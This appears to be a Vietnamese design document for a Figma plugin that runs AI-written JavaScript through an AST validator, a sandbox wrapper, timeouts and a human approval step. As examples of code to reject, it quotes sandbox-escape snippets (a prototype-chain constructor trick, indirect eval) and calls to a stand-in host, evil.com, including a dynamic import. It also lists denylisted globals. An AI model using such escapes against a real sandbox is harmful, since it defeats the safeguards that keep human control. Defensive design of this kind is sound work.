
## 🔴 Các điểm đã sửa trong tài liệu này (rev 2)

1. **Timeout không thể enforce bằng `setTimeout` thông thường** — phải AST-instrument vòng lặp (chèn `await __tick()`) → xem mục "Timeout thật sự hoạt động thế nào".
2. **`new Function("figma", "console", ...)` KHÔNG phải sandbox** — chỉ là convenience wrapper. Security boundary thật sự là **AST validator** → xem mục "Execution wrapper — bản chất thật".
3. **`figma.createText()` bắt buộc load font trước khi set `characters`** — plugin phải inject helper, nếu không AI sẽ fail kinh điển.
4. **max nodes / max commands** cần cơ chế `Proxy` đếm lệnh, không chỉ là con số cấu hình.
5. **Protocol** bổ sung: `log` phải có `id`, heartbeat, capabilities trong `hello`, thống nhất 1 result shape, quy tắc nhiều plugin kết nối.
6. **Approval UX**: plugin UI có toggle Auto-run, mặc định OFF (human-in-the-loop).
7. **Mixed content** `ws://localhost` từ trang https — ghi chú fallback.

---

## Kiến trúc tổng thể

```text
┌──────────────────────┐
│       AI Agent       │
│                      │
│ "Create 3 cards..."  │
└──────────┬───────────┘
           │
           │ MCP
           ▼
┌──────────────────────┐
│      MCP Server      │
│                      │
│  generate/receive JS │
│  validate code       │
│  execution policy    │
└──────────┬───────────┘
           │
           │ localhost WS
           │
           ▼
┌──────────────────────┐
│    Figma Plugin UI   │
│   (WS bridge +        │
│    approval UX)       │
└──────────┬───────────┘
           │ postMessage
           ▼
┌──────────────────────┐
│   Plugin Main Thread │
│                      │
│   AST validation     │
│   Sandbox executor   │
│   figma.*            │
└──────────┬───────────┘
           ▼
       Figma Canvas
```

> **Lưu ý triển khai:** validate + execute chạy ở **Plugin Main Thread** (nơi có `figma.*`), không phải ở MCP Server. MCP Server chỉ là transport/orchestration + policy source (gửi limits kèm request). Plugin UI không có quyền truy cập `figma.*`, nên chỉ làm 2 việc: **WS bridge** và **approval UX**.

### Nhưng có một vấn đề

Nếu code được chạy ở **Plugin Main Thread**, bạn muốn code AI có thể viết:

```js
const frame = figma.createFrame();

frame.resize(400, 300);

// ⚠️ KHÔNG được: const text = figma.createText(); text.characters = "Hello";
// (Figma yêu cầu load font trước khi set characters — xem mục "Bẫy kinh điển")
const text = await helpers.createText("Hello");
```

Điều này rất tiện.

Nhưng nếu AI code có thể tùy ý làm:

```js
fetch("https://evil.com/...");
```

hoặc truy cập những global/API khác, bạn đã mở một execution surface khá lớn.

Vì vậy tôi sẽ làm **sandbox ở giữa**.

---

# Phương án tôi thích nhất

Thay vì:

```text
AI
 ↓
eval(code)
 ↓
Figma
```

hãy làm:

```text
AI
 ↓
JavaScript
 ↓
AST Parser
 ↓
Security Validator
 ↓
Sandbox Executor
 ↓
Figma API
```

Ví dụ AI generate:

```js
const frame = figma.createFrame();

frame.name = "Card";
frame.resize(320, 200);

const text = await helpers.createText("Hello World");   // helper đã load font bên trong

frame.appendChild(text);
figma.currentPage.appendChild(frame);
```

Validator kiểm tra:

```text
✓ figma.createFrame
✓ helpers.createText
✓ figma.currentPage
✓ node.resize
✓ node.appendChild

→ SAFE
```

Nhưng:

```js
fetch("https://example.com");
```

→ reject.

Hoặc:

```js
"".constructor.constructor("return this")();   // prototype-chain escape
```

→ reject (denylist `constructor`/`__proto__`/`prototype`).

Hoặc:

```js
await import("https://evil.com/module.js");    // dynamic import
```

→ reject. (Lưu ý: `require()` không tồn tại trong sandbox Figma, nhưng dynamic `import()` thì có — phải chặn cả 2.)

---

# Tôi sẽ thêm một execution wrapper

> ⚠️ **Đính chính quan trọng:** `new Function` với tham số shadowed **KHÔNG phải là sandbox an toàn**. Code vẫn thoát được qua prototype chain:
>
> ```js
> "".constructor.constructor("return this")()   // → global object gốc
> (0, eval)("...")                              // → eval qua global
> ```
>
> **Security boundary thật sự là AST validator chạy TRƯỚC bước này.** Wrapper chỉ có tác dụng làm cho code AI "đẹp" và chặn tình cờ (accidental), không chặn chủ đích (intentional). Chặn chủ đích là việc của validator + denylist bên dưới.

Thay vì:

```js
async function runAI(code) {
  const fn = new Function(
    "figma",
    "console",
    `"use strict";
     ${code}
    `
  );

  return await fn(figma, console);
}
```

AI code chỉ nhận:

```text
figma
console
```

làm dependency.

## Execution wrapper — bản chất thật

Wrapper hoàn chỉnh (async, có guard, có font helper):

```js
async function runAI(sanitizedCode, limits) {
  const fn = new Function(
    "__ctx",
    `"use strict";
     const { figma, console, helpers, guard } = __ctx;
     return (async () => {
       ${sanitizedCode}
     })();`
  );
  return await fn({ figma: sandboxFigma, console: captureConsole, helpers, guard });
}
```

### AST validator phải denylist tối thiểu:

| Category | Bị cấm |
|---|---|
| Dangerous globals | `fetch`, `XMLHttpRequest`, `WebSocket`, `eval`, `Function`, `require`, `import()`, `WebAssembly`, `globalThis`, `self` |
| Prototype escape | mọi member access có tên `constructor`, `__proto__`, `prototype` |
| Computed access động | `obj[expr]` với `expr` không phải string literal — hoặc đơn giản hơn: **cấm toàn bộ computed member access ngoài string literal** |
| Figma surface | `figma.ui`, `figma.showUI`, `figma.settings`, `figma.fileKey`… (whitelist property truy cập từ `figma.`) |
| Syntax | `WithStatement`, labeled break/overflow recursion không kiểm soát (optional cho MVP) |

Flow:

```text
raw code
  → parse (acorn)                 // fail parse = reject
  → walk & check denylist         // vi phạm = reject, kèm line/col
  → instrument loops              // chèn await guard.tick()
  → codegen lại từ source+splice  // KHÔNG dùng eval của code gốc
  → execute trong wrapper
```

---

# Timeout thật sự hoạt động thế nào

Main thread của Figma plugin là **single-threaded** và **không có worker**. Một vòng lặp `while (true) {}` **đồng bộ** sẽ treo plugin vĩnh viễn — `Promise.race` + `setTimeout` **không cắt được**, vì timer callback không bao giờ có cơ hội chạy.

→ Timeout chỉ enforce được nếu **mọi vòng lặp được instrument để nhường quyền điều khiển (yield)**:

```js
// AST transform: mỗi loop body được chèn
while (i < 100) {
  await guard.tick();   // ← check deadline + cancel flag + max commands
  ...
}
```

`guard.tick()` implement:

```js
const guard = {
  deadline: Date.now() + limits.timeoutMs,
  async tick() {
    if (cancelled) throw new ExecutionCancelled();
    if (Date.now() > guard.deadline) throw new TimeoutError();
    commands++;
    if (commands > limits.maxCommands) throw new BudgetError();
    await Promise.resolve();   // yield về event loop
  },
};
```

Ngoài loop instrument, bổ sung 2 lớp phòng vệ:

1. **Validator từ chối loop không có khả năng kết thúc tĩnh** (không có `break`/`return`/`throw`/`await` trong body) → reject ngay từ đầu, báo lỗi về agent.
2. **Server-side watchdog:** MCP server timeout request (ví dụ `timeoutMs + 2000ms`) và trả lỗi cho agent nếu plugin treo/không phản hồi.

### max nodes / max commands đếm bằng gì?

Không đếm được nếu chỉ để cấu hình. Triển khai bằng **`Proxy` bọc `figma`**:

```js
const sandboxFigma = new Proxy(figma, {
  get(target, prop) {
    if (BLOCKED_PROPS.has(prop)) throw new PolicyError(`figma.${String(prop)} is blocked`);
    const val = target[prop];
    if (prop.startsWith("create") && typeof val === "function") {
      return (...args) => {
        guard.countCommand();
        const node = val.apply(target, args);
        if (node?.type) {
          createdCount++;
          if (createdCount > limits.maxNodes) throw new BudgetError();
          createdNodes.push({ id: node.id, name: node.name, type: node.type });
        }
        return node;
      };
    }
    return val;
  },
});
```

> Giới hạn đã biết (ghi rõ để không kỳ vọng sai): Proxy chỉ đếm **top-level `figma.create*`**. Các thao tác như `node.clone()`, `figma.currentPage.appendChild()` không bị đếm ở MVP. Chấp nhận được vì loop đã bị tick-gate, còn node clone chịu giới hạn thời gian tổng.

### Config mặc định

```text
Execution:
  timeout       5 sec
  max nodes     1,000
  max commands  10,000
```

---

# ⚠️ Bẫy kinh điển: createText + font

```js
const text = figma.createText();
text.characters = "Hello";   // ❌ THROW — font chưa được load
```

API Figma **bắt buộc** `await figma.loadFontAsync(fontName)` trước khi set `characters`. Đây là lỗi AI gặp nhiều nhất khi viết code plugin.

→ Plugin **inject helper** vào context, AI dùng helper thay vì raw API:

```js
const { createText } = helpers;   // đã load font sẵn bên trong

const t = await createText("Hello", { fontSize: 24 });
```

Helper mặc định: `createText`, `setAllText`, `loadFontOrDefault` (fallback Inter khi font không có).

---

# Thêm một thứ cực kỳ đáng giá: `console.log`

Cho AI agent nhận được output. `console` được wrap để gom log vào buffer của execution hiện tại:

```js
console.log("Creating card");

const frame = figma.createFrame();

console.log(frame.id);
```

MCP nhận:

```json
{
  "logs": [
    "Creating card",
    "123:456"
  ]
}
```

Nếu lỗi:

```js
throw new Error("Cannot find Button component");
```

Agent nhận:

```text
Execution failed:

Error: Cannot find Button component
```

và có thể **tự sửa code rồi chạy lại**.

Đây chính là điểm làm hệ thống trở nên giống coding agent:

```text
Generate
   ↓
Execute
   ↓
Error
   ↓
AI analyzes
   ↓
Fix code
   ↓
Execute again
   ↓
Success
```

---

# Approval UX (human-in-the-loop)

AST validator là phòng thủ tự động — cần thêm phòng thủ cuối là **con người**:

- Plugin UI có toggle **Auto-run** — **mặc định OFF**.
- Khi OFF: mỗi request `execute` hiện code (syntax highlight) + nút **Run / Reject**. Agent nhận `error: awaiting_user_approval` nếu user chưa bấm.
- Khi ON: execute chạy ngay (dành cho workflow đã tin cậy / demo).
- UI hiển thị log streaming + danh sách node đã tạo của mỗi run.

---

## Tôi sẽ xây MVP theo đúng flow này

```text
                    ┌─────────────┐
                    │  AI Agent   │
                    └──────┬──────┘
                           │ MCP
                           ▼
                    ┌─────────────┐
                    │ MCP Server  │
                    └──────┬──────┘
                           │
                     WebSocket
                           │
                           ▼
                 ┌─────────────────┐
                 │ Figma Plugin UI │
                 └────────┬────────┘
                          │
                     postMessage
                          │
                          ▼
                 ┌─────────────────┐
                 │ Plugin Main     │
                 │                 │
                 │ AST validation  │
                 │ Code execution  │
                 └────────┬────────┘
                          │
                          ▼
                     Figma API
```

Và protocol chỉ cần vài message ban đầu:

```text
hello    ping/pong    execute    result    log    cancel    canceled
```

### Quy tắc protocol (đã siết lại)

1. **Mọi message gắn với một execution đều có `id`** — kể cả `log`.
2. **Chỉ có 1 result shape:** error không phải message riêng — nằm trong `result` với `ok: false`. Message `error` riêng bị loại để khỏi mơ nghĩa. `cancel` là message riêng (fire-and-forget từ server), plugin trả về `result` với `ok:false, code:"CANCELLED"`.
3. **Heartbeat:** plugin gửi `ping` mỗi 3s; server coi như disconnect sau 10s không có ping. Server trả `pong`.
4. **Một kết nối active tại một thời điểm (last-man-wins):** server chỉ giữ 1 plugin connection mỗi instance. Khi plugin mới kết nối, nó **thay thế** kết nối cũ: server gửi `hello` với `code: "REPLACED"` rồi đóng socket cũ bằng close code `4001`. Plugin bị thay thế **không tự reconnect vòng lặp** (UI hiển thị "Replaced…" và chờ bấm ↻ Reconnect để giành lại kết nối). Capability `multipleClients` để sau này.

Ví dụ:

```json
// plugin → server (khi connect)
{
  "type": "hello",
  "pluginName": "Figma MCP Connector",
  "protocolVersion": 1,
  "fileKey": "abc123",
  "fileName": "Design System"
}

// server → plugin
{ "type": "hello", "role": "server", "protocolVersion": 1 }

// server → plugin
{
  "type": "execute",
  "id": "exec_001",
  "code": "const f = figma.createFrame(); ...",
  "limits": { "timeoutMs": 5000, "maxNodes": 1000, "maxCommands": 10000 }
}

// plugin → server, log stream (có id để server biết thuộc run nào)
{ "type": "log", "id": "exec_001", "level": "log", "args": ["Creating card", "123:456"] }

// plugin → server — CHỈ MỘT SHAPE cho cả success và failure
{
  "type": "result",
  "id": "exec_001",
  "ok": true,
  "value": { "createdNodes": ["123:456"], "nodeCount": 2, "commandsUsed": 37, "durationMs": 812 }
}

{
  "type": "result",
  "id": "exec_002",
  "ok": false,
  "code": "TIMEOUT",          // TIMEOUT | CANCELLED | POLICY | SYNTAX | BUDGET | RUNTIME | REJECTED
  "error": "Execution exceeded 5000ms",
  "logs": ["..."]
}

// server → plugin (hủy đang chạy)
{ "type": "cancel", "id": "exec_001" }
```

### Mixed content `ws://localhost`

Plugin UI chạy trong trang `https://figma.com` nhưng mở `ws://localhost:10060+id`. Hầu hết browser hiện đại coi `localhost` là potentially trustworthy nên **chạy được** (đã được các project cùng loại xác nhận). Nếu môi trường nào chặn:

- Fallback 1: dùng **Figma Desktop app** (bypass được một số hạn chế web).
- Fallback 2: serve **wss://** với self-signed cert + hướng dẫn user accept cert một lần.
- Ghi chú cổng mặc định **10060** cho plugin (MCP client dùng **10030**, Streamable HTTP); cả hai cộng thêm `id` khi chạy `figma-mcp <id>`, và cổng plugin cấu hình được qua UI.

---

**Nếu mục tiêu là làm một “Claude Code cho Figma”, tôi sẽ chọn hướng này:** AI thực sự viết JavaScript, MCP chỉ làm transport/orchestration, còn Plugin là runtime có `figma.*`; trước khi chạy thì AST/policy layer kiểm soát code. Đây là điểm cân bằng tốt giữa **tính tự do của code** và **an toàn**.
